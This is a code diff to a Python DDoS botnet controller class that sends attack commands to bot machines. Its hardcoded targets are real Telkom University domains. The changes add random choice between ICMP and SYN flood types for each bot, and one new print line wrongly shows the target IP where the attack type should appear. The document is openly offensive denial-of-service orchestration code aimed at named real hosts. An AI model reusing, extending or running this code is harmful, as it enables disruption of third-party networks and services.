@@ -34,7 +34,7 @@ class DDoSMaster:
         self.message = {
             "type": "attack",  # "attack" or "stop"
             "target_ip": ["igracias.telkomuniversity.ac.id", "telkomuniversity.ac.id"],
-            "attack_type": "syn",
+            "attack_type": ["icmp", "syn"],
             "number_of_attack": 1000
         }
         self.bot_thread = []
@@ -43,10 +43,12 @@ class DDoSMaster:
     def distributeCommand(self):
         """distributing command that has been build to botnet"""
         n_targets = len(self.message["target_ip"])
+        n_type = len(self.message["attack_type"])
         for bot in self.botnets:
             target_idx = random.randint(0, n_targets-1)
+            type_idx = random.randint(0, n_type-1)
             if self.message["type"] == "attack":
-                print(bot + " --attacking--> " +
+                print(bot + " --attacking with " + self.message["target_ip"][target_idx] + "--> " +
                       self.message["target_ip"][target_idx])
             elif self.message["type"] == "stop":
                 print(bot + " --stop attacking--X " +
@@ -54,6 +56,7 @@ class DDoSMaster:
             try:
                 message_to_botnet = copy.deepcopy(self.message)
                 message_to_botnet["target_ip"] = self.message["target_ip"][target_idx]
+                message_to_botnet["attack_type"] = self.message["attack_type"][type_idx]
                 current = CommandRunner(bot, message_to_botnet)
                 self.bot_thread.append(current)
                 current.start()
@@ -79,6 +82,7 @@ class DDoSMaster:
         return list(set(ip_list))
 
     def parseMenu(self, menu):
+        "Mengurai dan menjalankan menu yang dipilih oleh user"
         if menu == "1":
             # print("!")
             self.buildAttack()
@@ -126,7 +130,9 @@ class DDoSMaster:
         self.message["target_ip"] = ip_target.split(",")
         if len(self.message["target_ip"]) == 1:
             list_targets = []
-            list.append(self.message["target_ip"])
+            list_type = []
+            list_targets.append(self.message["target_ip"][0])
+            list_type.append(self.message["attack_type"][0])
             self.message["target_ip"] = list_targets
         self.message["attack_type"] = attack_type.split(",")
         self.message["number_of_attack"] = number_of_attack
